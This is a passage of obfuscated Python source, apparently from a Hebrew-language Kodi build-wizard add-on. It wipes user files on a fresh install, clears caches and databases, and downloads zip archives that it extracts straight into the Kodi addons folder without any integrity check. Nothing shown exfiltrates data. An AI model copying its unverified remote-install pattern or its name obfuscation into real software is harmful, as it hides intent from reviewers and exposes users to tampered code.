				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.elementum'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4696
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4697
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4698
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.quasar'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4700
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'program.apollo'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4701
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4702
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4703
				elif OOOOO0OOOO00OO00O in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOO0OOOO00OO00O ,xbmc .LOGNOTICE )#line:4704
				elif OOOOO0OOOO00OO00O .endswith ('.db'):#line:4705
					try :#line:4706
						if OOOOO0OOOO00OO00O ==O0OOOOO0O000O0O00 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOO0OOOO00OO00O ,KODIV ),xbmc .LOGNOTICE )#line:4707
						else :os .remove (os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ))#line:4708
					except Exception as O0O0OO0OOO0O000OO :#line:4709
						if not OOOOO0OOOO00OO00O .startswith ('Textures13'):#line:4710
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4711
							wiz .log ("-> %s"%(str (O0O0OO0OOO0O000OO )),xbmc .LOGNOTICE )#line:4712
							wiz .purgeDb (os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ))#line:4713
				else :#line:4714
					DP .update (int (wiz .percentage (O0O00OO000O000O0O ,OOO0OO00OO00O00OO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0OOOO00OO00O ),'')#line:4715
					try :os .remove (os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ))#line:4716
					except Exception as O0O0OO0OOO0O000OO :#line:4717
						wiz .log ("Error removing %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4718
						wiz .log ("-> / %s"%(str (O0O0OO0OOO0O000OO )),xbmc .LOGNOTICE )#line:4719
			if DP .iscanceled ():#line:4720
				DP .close ()#line:4721
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4722
				return False #line:4723
		for O00OO00000O0O0O0O ,O00OO0OO0OO0000OO ,OO0O0O0000O0O00O0 in os .walk (O000OOO0OO0O0O00O ,topdown =True ):#line:4724
			O00OO0OO0OO0000OO [:]=[OOO0O0OO00O00O00O for OOO0O0OO00O00O00O in O00OO0OO0OO0000OO if OOO0O0OO00O00O00O not in EXCLUDES ]#line:4725
			for OOOOO0OOOO00OO00O in O00OO0OO0OO0000OO :#line:4726
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO0OOOO00OO00O ),'')#line:4727
			  if OOOOO0OOOO00OO00O not in ["Database","userdata","temp","addons","addon_data"]:#line:4728
			   if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4729
			    if not (OOOOO0OOOO00OO00O =='skin.titan'and KEEPSKIN3 =='true'):#line:4731
			      if not (OOOOO0OOOO00OO00O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4732
			       if not (OOOOO0OOOO00OO00O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4733
			        if not (OOOOO0OOOO00OO00O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4734
			         if not (OOOOO0OOOO00OO00O =='program.apollo'and KEEPINFO =='true'):#line:4735
			          if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4736
			            if not (OOOOO0OOOO00OO00O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4738
			             if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4739
			              if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4740
			               if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4741
			                if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4742
			                 if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4743
			                  if not (OOOOO0OOOO00OO00O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4744
			                   if not (OOOOO0OOOO00OO00O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4745
			                    if not (OOOOO0OOOO00OO00O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4746
			                     if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4747
			                       if not (OOOOO0OOOO00OO00O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4749
			                           if not (OOOOO0OOOO00OO00O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4753
			                            if not (OOOOO0OOOO00OO00O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4754
			                             if not (OOOOO0OOOO00OO00O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4755
			                              if not (OOOOO0OOOO00OO00O =='plugin.video.quasar'and KEEPINFO =='true'):#line:4756
			                               if not (OOOOO0OOOO00OO00O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4757
			                                  shutil .rmtree (os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),ignore_errors =True ,onerror =None )#line:4759
			if DP .iscanceled ():#line:4760
				DP .close ()#line:4761
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4762
				return False #line:4763
		DP .close ()#line:4764
		wiz .clearS ('build')#line:4765
		if over ==True :#line:4766
			return True #line:4767
		elif install =='restore':#line:4768
			return True #line:4769
		elif install :#line:4770
			buildWizard (install ,'normal',over =True )#line:4771
		else :#line:4772
			if INSTALLMETHOD ==1 :O0OOOO0OOO0OO000O =1 #line:4773
			elif INSTALLMETHOD ==2 :O0OOOO0OOO0OO000O =0 #line:4774
			else :O0OOOO0OOO0OO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4775
			if O0OOOO0OOO0OO000O ==1 :wiz .reloadFix ('fresh')#line:4776
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4777
	else :#line:4778
		if not install =='restore':#line:4779
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4780
			wiz .refresh ()#line:4781
def clearCache ():#line:4786
		wiz .clearCache ()#line:4787
def fixwizard ():#line:4791
		wiz .fixwizard ()#line:4792
def totalClean ():#line:4794
		wiz .clearCache ()#line:4796
		wiz .clearPackages ('total')#line:4797
		clearThumb ('total')#line:4798
		cleanfornewbuild ()#line:4799
def cleanfornewbuild ():#line:4800
		try :#line:4801
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4802
		except :#line:4803
			pass #line:4804
		try :#line:4805
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4806
		except :#line:4807
			pass #line:4808
		try :#line:4809
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4810
		except :#line:4811
			pass #line:4812
def clearThumb (type =None ):#line:4813
	OOOO00OOOOOOOO0O0 =wiz .latestDB ('Textures')#line:4814
	if not type ==None :OOOO00O0O0000O00O =1 #line:4815
	else :OOOO00O0O0000O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOO00OOOOOOOO0O0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4816
	if OOOO00O0O0000O00O ==1 :#line:4817
		try :wiz .removeFile (os .join (DATABASE ,OOOO00OOOOOOOO0O0 ))#line:4818
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOO00OOOOOOOO0O0 )#line:4819
		wiz .removeFolder (THUMBS )#line:4820
	else :wiz .log ('Clear thumbnames cancelled')#line:4822
	wiz .redoThumbs ()#line:4823
def purgeDb ():#line:4825
	OOOO0O00OO0O00OO0 =[];OO000OO0O00OO0OOO =[]#line:4826
	for OO0O0O0O0000O0O00 ,OO0OO0O000000OO00 ,OOO0OOOOO0O0O000O in os .walk (HOME ):#line:4827
		for O000O00O00O0000OO in fnmatch .filter (OOO0OOOOO0O0O000O ,'*.db'):#line:4828
			if O000O00O00O0000OO !='Thumbs.db':#line:4829
				OO00OO0OOO0O0O0O0 =os .path .join (OO0O0O0O0000O0O00 ,O000O00O00O0000OO )#line:4830
				OOOO0O00OO0O00OO0 .append (OO00OO0OOO0O0O0O0 )#line:4831
				OO0O00000OOOOOOOO =OO00OO0OOO0O0O0O0 .replace ('\\','/').split ('/')#line:4832
				OO000OO0O00OO0OOO .append ('(%s) %s'%(OO0O00000OOOOOOOO [len (OO0O00000OOOOOOOO )-2 ],OO0O00000OOOOOOOO [len (OO0O00000OOOOOOOO )-1 ]))#line:4833
	if KODIV >=16 :#line:4834
		O0OOO0OOO0000O0OO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO000OO0O00OO0OOO )#line:4835
		if O0OOO0OOO0000O0OO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4836
		elif len (O0OOO0OOO0000O0OO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4837
		else :#line:4838
			for OOOOO0OOOOOO00000 in O0OOO0OOO0000O0OO :wiz .purgeDb (OOOO0O00OO0O00OO0 [OOOOO0OOOOOO00000 ])#line:4839
	else :#line:4840
		O0OOO0OOO0000O0OO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO000OO0O00OO0OOO )#line:4841
		if O0OOO0OOO0000O0OO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4842
		else :wiz .purgeDb (OOOO0O00OO0O00OO0 [OOOOO0OOOOOO00000 ])#line:4843
def fastupdatefirstbuild (OOOOO0O000OO00000 ):#line:4849
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4850
	if ENABLE =='Yes':#line:4851
		if not NOTIFY =='true':#line:4852
			O0O000O00O0OO0000 =wiz .workingURL (NOTIFICATION )#line:4853
			if O0O000O00O0OO0000 ==True :#line:4854
				OO000O0OO000OO0O0 ,O000OO000O0OO0OO0 =wiz .splitNotify (NOTIFICATION )#line:4855
				if not OO000O0OO000OO0O0 ==False :#line:4857
					try :#line:4858
						OO000O0OO000OO0O0 =int (OO000O0OO000OO0O0 );OOOOO0O000OO00000 =int (OOOOO0O000OO00000 )#line:4859
						checkidupdate ()#line:4860
						wiz .setS ("notedismiss","true")#line:4861
						if OO000O0OO000OO0O0 ==OOOOO0O000OO00000 :#line:4862
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO000O0OO000OO0O0 ),xbmc .LOGNOTICE )#line:4863
						elif OO000O0OO000OO0O0 >OOOOO0O000OO00000 :#line:4865
							wiz .log ("[Notifications] id: %s"%str (OO000O0OO000OO0O0 ),xbmc .LOGNOTICE )#line:4866
							wiz .setS ('noteid',str (OO000O0OO000OO0O0 ))#line:4867
							wiz .setS ("notedismiss","true")#line:4868
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4871
					except Exception as O000O0000O0O0O0OO :#line:4872
						wiz .log ("Error on Notifications Window: %s"%str (O000O0000O0O0O0OO ),xbmc .LOGERROR )#line:4873
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4875
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O000O00O0OO0000 ),xbmc .LOGNOTICE )#line:4876
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4877
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4878
def checkidupdate ():#line:4884
				wiz .setS ("notedismiss","true")#line:4886
				O0O0000OOO000OOO0 =wiz .workingURL (NOTIFICATION )#line:4887
				O000OOOO000O000OO =" Kodi Premium"#line:4889
				OO00O0OOO0OOOO00O =wiz .checkBuild (O000OOOO000O000OO ,'gui')#line:4890
				O0OOO0OO0000OOOOO =O000OOOO000O000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4891
				if not wiz .workingURL (OO00O0OOO0OOOO00O )==True :return #line:4892
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4893
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O000OOOO000O000OO ),'','אנא המתן')#line:4894
				O00O0000O0000O000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOO0OO0000OOOOO )#line:4895
				try :os .remove (O00O0000O0000O000 )#line:4896
				except :pass #line:4897
				logging .warning (OO00O0OOO0OOOO00O )#line:4898
				if 'google'in OO00O0OOO0OOOO00O :#line:4899
				   OO0000O0OOO000O00 =googledrive_download (OO00O0OOO0OOOO00O ,O00O0000O0000O000 ,DP ,wiz .checkBuild (O000OOOO000O000OO ,'filesize'))#line:4900
				else :#line:4903
				  downloader .download (OO00O0OOO0OOOO00O ,O00O0000O0000O000 ,DP )#line:4904
				xbmc .sleep (100 )#line:4905
				OO0000OOOO0OO0000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOO000O000OO )#line:4906
				DP .update (0 ,OO0000OOOO0OO0000 ,'','אנא המתן')#line:4907
				extract .all (O00O0000O0000O000 ,HOME ,DP ,title =OO0000OOOO0OO0000 )#line:4908
				DP .close ()#line:4909
				wiz .defaultSkin ()#line:4910
				wiz .lookandFeelData ('save')#line:4911
				if KODIV >=18 :#line:4912
					skindialogsettind18 ()#line:4913
				if INSTALLMETHOD ==1 :OOOO00O0000000OOO =1 #line:4916
				elif INSTALLMETHOD ==2 :OOOO00O0000000OOO =0 #line:4917
				else :DP .close ()#line:4918
def gaiaserenaddon ():#line:4920
  OO0O000000000O00O =(ADDON .getSetting ("gaiaseren"))#line:4921
  O0O00OOOO0OO00OOO =(ADDON .getSetting ("rdbuild"))#line:4922
  if OO0O000000000O00O =='true'and O0O00OOOO0OO00OOO =='true':#line:4923
    OO0O0O00O000OOO0O =(NEWFASTUPDATE )#line:4924
    OO0O0O00OOOO0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4925
    OOO0O000OOO00OOOO =xbmcgui .DialogProgress ()#line:4926
    OOO0O000OOO00OOOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4927
    O00OO0O0OOOO000O0 =os .path .join (PACKAGES ,'isr.zip')#line:4928
    O00OOOOO00OO0O000 =urllib2 .Request (OO0O0O00O000OOO0O )#line:4929
    OO00OOO0O0O0O0OO0 =urllib2 .urlopen (O00OOOOO00OO0O000 )#line:4930
    O000O00O0OOOO0000 =xbmcgui .DialogProgress ()#line:4932
    O000O00O0OOOO0000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4933
    O000O00O0OOOO0000 .update (0 )#line:4934
    O0OOO0O0O000O0O00 =open (O00OO0O0OOOO000O0 ,'wb')#line:4936
    try :#line:4938
      OOO000O00O00O00OO =OO00OOO0O0O0O0OO0 .info ().getheader ('Content-Length').strip ()#line:4939
      O0OOO00OO00O0000O =True #line:4940
    except AttributeError :#line:4941
          O0OOO00OO00O0000O =False #line:4942
    if O0OOO00OO00O0000O :#line:4944
          OOO000O00O00O00OO =int (OOO000O00O00O00OO )#line:4945
    O0O00O00OO000OOO0 =0 #line:4947
    OO0OO0OOOOOOOOO00 =time .time ()#line:4948
    while True :#line:4949
          OO0O0O00O0OOO0OO0 =OO00OOO0O0O0O0OO0 .read (8192 )#line:4950
          if not OO0O0O00O0OOO0OO0 :#line:4951
              sys .stdout .write ('\n')#line:4952
              break #line:4953
          O0O00O00OO000OOO0 +=len (OO0O0O00O0OOO0OO0 )#line:4955
          O0OOO0O0O000O0O00 .write (OO0O0O00O0OOO0OO0 )#line:4956
          if not O0OOO00OO00O0000O :#line:4958
              OOO000O00O00O00OO =O0O00O00OO000OOO0 #line:4959
          if O000O00O0OOOO0000 .iscanceled ():#line:4960
             O000O00O0OOOO0000 .close ()#line:4961
             try :#line:4962
              os .remove (O00OO0O0OOOO000O0 )#line:4963
             except :#line:4964
              pass #line:4965
             break #line:4966
          OOO0OOO0O0O0000OO =float (O0O00O00OO000OOO0 )/OOO000O00O00O00OO #line:4967
          OOO0OOO0O0O0000OO =round (OOO0OOO0O0O0000OO *100 ,2 )#line:4968
          O00O00OO0O0OOO00O =O0O00O00OO000OOO0 /(1024 *1024 )#line:4969
          OO000O000O000O000 =OOO000O00O00O00OO /(1024 *1024 )#line:4970
          OOOO00O00O00OO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O00OO0O0OOO00O ,'teal',OO000O000O000O000 )#line:4971
          if (time .time ()-OO0OO0OOOOOOOOO00 )>0 :#line:4972
            O0000O000OO00OO00 =O0O00O00OO000OOO0 /(time .time ()-OO0OO0OOOOOOOOO00 )#line:4973
            O0000O000OO00OO00 =O0000O000OO00OO00 /1024 #line:4974
          else :#line:4975
           O0000O000OO00OO00 =0 #line:4976
          O0OOO0O00000OO000 ='KB'#line:4977
          if O0000O000OO00OO00 >=1024 :#line:4978
             O0000O000OO00OO00 =O0000O000OO00OO00 /1024 #line:4979
             O0OOO0O00000OO000 ='MB'#line:4980
          if O0000O000OO00OO00 >0 and not OOO0OOO0O0O0000OO ==100 :#line:4981
              OO00O0000OOO0O0OO =(OOO000O00O00O00OO -O0O00O00OO000OOO0 )/O0000O000OO00OO00 #line:4982
          else :#line:4983
              OO00O0000OOO0O0OO =0 #line:4984
          OOO0O0O00OOOOOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0000O000OO00OO00 ,O0OOO0O00000OO000 )#line:4985
          O000O00O0OOOO0000 .update (int (OOO0OOO0O0O0000OO ),OOOO00O00O00OO00O ,OOO0O0O00OOOOOO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4987
    OO000OOOOOOO00O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4990
    O0OOO0O0O000O0O00 .close ()#line:4993
    extract .all (O00OO0O0OOOO000O0 ,OO000OOOOOOO00O0O ,O000O00O0OOOO0000 )#line:4994
    try :#line:4998
      os .remove (O00OO0O0OOOO000O0 )#line:4999
    except :#line:5000
      pass #line:5001
def testnotify ():#line:5003
	OOO0000OOOO000O00 =wiz .workingURL (NOTIFICATION )#line:5004
	if OOO0000OOOO000O00 ==True :#line:5005
		try :#line:5006
			OOO00OO0O0O00O0OO ,OO0OO0OOOOOO0OOOO =wiz .splitNotify (NOTIFICATION )#line:5007
			if OOO00OO0O0O00O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5008
			if STARTP2 ()=='ok':#line:5009
				notify .notification (OO0OO0OOOOOO0OOOO ,True )#line:5010
		except Exception as O00OOOOO0OOOO0O00 :#line:5011
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOOO0OOOO0O00 ),xbmc .LOGERROR )#line:5012
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5013
def testnotify2 ():#line:5014
	O0OOOO000OO0O0O0O =wiz .workingURL (NOTIFICATION2 )#line:5015
	if O0OOOO000OO0O0O0O ==True :#line:5016
		try :#line:5017
			O00000O00O0OO0000 ,OOO000O0OO00O00OO =wiz .splitNotify (NOTIFICATION2 )#line:5018
			if O00000O00O0OO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5019
			if STARTP2 ()=='ok':#line:5020
				notify .notification2 (OOO000O0OO00O00OO ,True )#line:5021
		except Exception as OO0O000OOO00O00OO :#line:5022
			wiz .log ("Error on Notifications Window: %s"%str (OO0O000OOO00O00OO ),xbmc .LOGERROR )#line:5023
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5024
def testnotify3 ():#line:5025
	O00OO00O0000OOO00 =wiz .workingURL (NOTIFICATION3 )#line:5026
	if O00OO00O0000OOO00 ==True :#line:5027
		try :#line:5028
			OOOOO00OOO0O000O0 ,O00OOO00OOOOO000O =wiz .splitNotify (NOTIFICATION3 )#line:5029
			if OOOOO00OOO0O000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5030
			if STARTP2 ()=='ok':#line:5031
				notify .notification3 (O00OOO00OOOOO000O ,True )#line:5032
		except Exception as O0OO0OO00O0OO000O :#line:5033
			wiz .log ("Error on Notifications Window: %s"%str (O0OO0OO00O0OO000O ),xbmc .LOGERROR )#line:5034
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5035
def servicemanual ():#line:5036
	OO0OOO00OO00OO00O =wiz .workingURL (HELPINFO )#line:5037
	if OO0OOO00OO00OO00O ==True :#line:5038
		try :#line:5039
			O0OO0OO000OOOO0OO ,OO00000OO0OOOO00O =wiz .splitNotify (HELPINFO )#line:5040
			if O0OO0OO000OOOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5041
			notify .helpinfo (OO00000OO0OOOO00O ,True )#line:5042
		except Exception as O0OO0O0OOO0OO0OO0 :#line:5043
			wiz .log ("Error on Notifications Window: %s"%str (O0OO0O0OOO0OO0OO0 ),xbmc .LOGERROR )#line:5044
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5045
def testupdate ():#line:5047
	if BUILDNAME =="":#line:5048
		notify .updateWindow ()#line:5049
	else :#line:5050
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5051
def testfirst ():#line:5053
	notify .firstRun ()#line:5054
def testfirstRun ():#line:5056
	notify .firstRunSettings ()#line:5057
def fastinstall ():#line:5060
	notify .firstRuninstall ()#line:5061
def addDir (O00OOOOO000O00O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5068
	O00OOOOO0O000O00O =sys .argv [0 ]#line:5069
	if not mode ==None :O00OOOOO0O000O00O +="?mode=%s"%urllib .quote_plus (mode )#line:5070
	if not name ==None :O00OOOOO0O000O00O +="&name="+urllib .quote_plus (name )#line:5071
	if not url ==None :O00OOOOO0O000O00O +="&url="+urllib .quote_plus (url )#line:5072
	OOOOOO000O0OOOO00 =True #line:5073
	if themeit :O00OOOOO000O00O00 =themeit %O00OOOOO000O00O00 #line:5074
	O0OO00OO0O0OOO0OO =xbmcgui .ListItem (O00OOOOO000O00O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5075
	O0OO00OO0O0OOO0OO .setInfo (type ="Video",infoLabels ={"Title":O00OOOOO000O00O00 ,"Plot":description })#line:5076
	O0OO00OO0O0OOO0OO .setProperty ("Fanart_Image",fanart )#line:5077
	if not menu ==None :O0OO00OO0O0OOO0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5078
	OOOOOO000O0OOOO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OOOOO0O000O00O ,listitem =O0OO00OO0O0OOO0OO ,isFolder =True )#line:5079
	return OOOOOO000O0OOOO00 #line:5080
def addFile (OO00OO0O0O0000O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5082
	O000OOO00O00O0O0O =sys .argv [0 ]#line:5083
	if not mode ==None :O000OOO00O00O0O0O +="?mode=%s"%urllib .quote_plus (mode )#line:5084
	if not name ==None :O000OOO00O00O0O0O +="&name="+urllib .quote_plus (name )#line:5085
	if not url ==None :O000OOO00O00O0O0O +="&url="+urllib .quote_plus (url )#line:5086
	O00OOO0O0OO0O0O00 =True #line:5087
	if themeit :OO00OO0O0O0000O0O =themeit %OO00OO0O0O0000O0O #line:5088
	O0OO0OOOOO0000O0O =xbmcgui .ListItem (OO00OO0O0O0000O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5089
	O0OO0OOOOO0000O0O .setInfo (type ="Video",infoLabels ={"Title":OO00OO0O0O0000O0O ,"Plot":description })#line:5090
	O0OO0OOOOO0000O0O .setProperty ("Fanart_Image",fanart )#line:5091
	if not menu ==None :O0OO0OOOOO0000O0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5092
